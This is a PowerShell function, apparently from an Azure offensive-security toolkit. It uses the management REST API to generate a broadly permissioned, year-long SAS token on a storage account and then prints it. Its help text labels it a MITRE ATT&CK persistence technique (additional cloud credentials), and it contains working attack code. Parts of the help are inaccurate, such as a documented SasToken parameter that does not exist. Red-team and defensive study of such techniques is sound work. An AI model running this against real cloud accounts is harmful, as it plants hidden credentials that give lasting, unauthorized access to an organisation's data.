function Add-StorageAccountSasToken {
    [cmdletbinding()]
    param (
        [Parameter(Mandatory = $true, ValueFromPipeline = $true)]
        [Microsoft.Azure.Commands.ResourceManager.Common.ArgumentCompleters.ResourceNameCompleterAttribute(
            "Microsoft.Storage/storageAccounts",
            "ResourceGroupName"
        )]
        [Alias('storageAccount', 'storage-account-name')]
        [string[]]$Name,

        [Parameter(Mandatory = $false, ValueFromPipeline = $false)]
        [Microsoft.Azure.Commands.ResourceManager.Common.ArgumentCompleters.ResourceGroupCompleterAttribute()]
        [Alias('rg', 'resource-group')]
        [string[]]$ResourceGroupName,

        [Parameter(Mandatory = $false)]
        [int]$TokenValidityDays = 365
    )

    begin {
        [void] $ResourceGroupName #Only used to trigger the ResourceGroupCompleter

        Write-Verbose "Starting function $($MyInvocation.MyCommand.Name)"
        $MyInvocation.MyCommand.Name | Invoke-BlackCat
    }

    process {
        Write-Verbose "Adding SAS token to storage account"
        $resourceId = (Invoke-AzBatch -ResourceType 'Microsoft.Storage/storageAccounts' | Where-Object { $_.Name -eq $Name }).id
        $uri = "https://management.azure.com$($resourceId)/listServiceSas?api-version=2016-05-01"

        $body = @{
            canonicalizedResource = "/blob/$($resourceId.split('/')[-5])/$($Name)"
            signedResource        = "c" # Options: b (blob), c (container), f (file), s (share)
            signedServices        = "bftq" # Blob, File, Table, Queue
            signedPermission      = "racwdl" # Read, Write, Delete, List, Add, Create, Update, Process
            signedProtocol        = "https"
            signedResourceTypes   = "s" # Service, Container, Object
            signedExpiry          = (Get-Date).AddDays($TokenValidityDays).ToString("yyyy-MM-ddTHH:mm:ssZ")
        }

        $requestParam = @{
            Headers = $authHeader
            Uri     = $uri
            Method  = 'POST'
            Body    = ($body | ConvertTo-Json)
            UserAgent = $sessionVariables.userAgent
        }
        $apiResponse = Invoke-RestMethod @requestParam

        Read-SasToken -SasToken $($apiResponse.serviceSasToken)

        Write-Output "SAS token added successfully with value: `n$($apiResponse.serviceSasToken)"
    }
    <#
    .SYNOPSIS
        This function adds a SAS token to a specified storage account using the REST API.

    .DESCRIPTION
        The Add-StorageAccountSasToken function makes a POST request to add a SAS token to a specified storage account using the provided session variables and authentication headers. It handles errors and logs messages accordingly.

    .PARAMETER Name
        The name parameter is a mandatory string that specifies the name of the storage account.

    .PARAMETER ResourceGroupName
        The ResourceGroupName parameter is a mandatory string that specifies the name of the resource group.

    .PARAMETER SasToken
        The SasToken parameter is a mandatory string that specifies the SAS token to be added to the storage account. If not provided, a default SAS token with the most permissions will be used.

    .PARAMETER TokenValidityDays
        The TokenValidityDays parameter is an optional integer that specifies the number of days the SAS token should be valid. The default value is 365 days.

    .EXAMPLE
        ```powershell
        Add-StorageAccountSasToken -Name "exampleStorageAccount" -TokenValidityDays 30
        ```
        This example calls the Add-StorageAccountSasToken function with the specified Name and TokenValidityDays.

    .LINK
        For more information, see the related documentation or contact support.

    .NOTES
    Author: Rogier Dijkman

    .LINK
        MITRE ATT&CK Tactic: TA0003 - Persistence
        https://attack.mitre.org/tactics/TA0003/

    .LINK
        MITRE ATT&CK Technique: T1098.001 - Account Manipulation: Additional Cloud Credentials
        https://attack.mitre.org/techniques/T1098/001/
    #>
}